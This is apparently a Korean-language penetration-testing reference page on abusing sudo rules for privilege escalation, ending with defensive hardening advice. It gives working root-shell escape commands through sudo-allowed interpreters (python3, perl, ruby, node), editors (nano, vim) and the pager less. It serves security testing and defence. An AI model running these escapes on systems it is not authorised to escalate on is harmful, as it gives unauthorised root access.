# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo-allowed interpreters

`sudo -l`이 사용자가 root로 인터프리터를 실행하도록 허용하는 경우, 이를 직접적인 코드 실행으로 간주하세요. 인터프리터는 임의의 코드를 실행하도록 설계되어 있으므로, `python3`, `perl`, `ruby`, `lua`, `node` 또는 이와 유사한 바이너리의 실행을 허용하는 규칙은 일반적으로 root 명령 실행과 동일합니다. 단, 인자가 엄격하게 제한되고 검증되는 경우는 예외입니다.

일반적인 검토 흐름:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
기타 인터프리터 예시:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
정확한 경로가 중요합니다. sudo 규칙에서 `/usr/bin/python3`을 허용한다면, 검증 중에도 정확히 해당 경로를 사용하세요:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

`sudo -l`이 사용자가 interactive editor를 root로 실행하도록 허용한다면, 이를 무해한 파일 편집 권한이 아니라 command-execution surface로 간주하세요. Editor는 내부에서 shell commands를 실행하고, 임의의 파일을 읽고 쓰거나, external helpers를 호출할 수 있는 경우가 많습니다.

일반적인 검토 흐름:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano`가 sudo를 통해 허용되면 편집기 인터페이스에서 command execution에 접근할 수 있습니다:
```text
Ctrl+R
Ctrl+X
```
그런 다음 다음과 같은 명령을 제공합니다:
```bash
id
/bin/sh
```
일부 터미널에서는 대화형 셸에 표준 스트림을 리디렉션해야 할 수 있습니다:
```bash
reset; /bin/sh 1>&0 2>&0
```
정확한 키 입력 순서는 nano 버전과 빌드 옵션에 따라 달라질 수 있지만, 보안 문제는 동일합니다. 편집기가 root 권한으로 실행되고 있으며 외부 명령을 호출할 수 있습니다.

### 기타 일반적인 editor escape

Vim-style 편집기는 일반적으로 `:!`를 통해 명령 실행 기능을 제공합니다:
```text
:!/bin/sh
```
`less`와 같은 Pagers는 shell 실행도 노출할 수 있습니다:
```text
!/bin/sh
```
## 방어 참고 사항

- sudo를 통해 interpreter 또는 interactive editor를 허용하지 마세요.
- 하나의 제한적인 관리 작업만 수행하는, 고정된 root 소유 wrapper를 우선 사용하세요.
- interpreter가 불가피한 경우 정확한 script 경로를 제한하고, 사용자가 제어하는 arguments, 쓰기 가능한 imports, `PYTHONPATH`, 안전하지 않은 environment 보존을 차단하세요.
- 파일 편집이 필요한 경우 정확한 파일 경로로 제한하고, 패치된 sudo 버전 및 엄격한 environment 처리를 적용한 `sudoedit` 사용을 고려하세요.
- `SETENV`, `env_keep`, 쓰기 가능한 working directory, 쓰기 가능한 module/import 경로, `NOEXEC`, `use_pty`, logging을 검토하되, 이를 완전한 sandbox로 간주하지 마세요.
